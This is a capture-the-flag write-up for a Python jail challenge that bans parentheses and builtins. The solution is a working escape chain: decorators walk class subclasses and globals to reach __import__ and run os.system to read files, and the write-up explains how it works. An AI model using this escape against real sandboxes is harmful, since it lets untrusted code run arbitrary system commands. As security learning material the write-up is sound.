# decorated

## challenge

I think I've figured out the problem - all of the problems in pyjails stem from calling functions. Well, I've put a stop to that!

Note: the server is running on python 3.10

decorated.py
```py
#!/usr/bin/env python3

code = []
print("Enter code:\n")
while line := input():
    assert line.isascii()
    code.append(line)

for line in code:
    if any(i in '()' for i in line):
        print("No calling functions!")
        exit()

exec('\n'.join(code), {"__builtins__": {}})
```

## solution

```py
command = lambda x: "cat *.txt"
import_list = []
os_list = []
x=__build_class__=lambda *_:_
g=x.__globals__
b=__builtins__
b|=g
type_class = lambda x: [].__class__.__class__
get_import = lambda x: x[0].register.__globals__["__builtins__"]["__import__"]
os_str = lambda x: "os"
@import_list.append
@get_import
@[].__class__.__class__.__subclasses__
@type_class
class X:
    pass
@os_list.append
@import_list[0]
@os_str
class X:
    pass
@os_list[0].system
@command
class X:
    pass
```

Robin has a fantastic writeup of using decorators (and a few other methods) to escape a similar pyjail here: https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/

Here, you don't have access to builtins, so you need to run a standard pyjail escape using decorators whenever you would need to call a function. The code above runs `[].__class__.__class__.__subclasses__([].__class__.__class__)[0].register.__globals__["__builtins__"]["__import__"]("os").system("cat *.txt")` with a few points of interest.

First, you can pass in the innermost argument to the function by just making a lambda that returns that value. Second, you need to add a function called `__build_class__` to builtins so you can make classes. Third, (I think) you can't have it all in one chain, because sometimes you need to take the result of a function call and access its attributes. I kept references to the objects I cared about by appending them to lists.
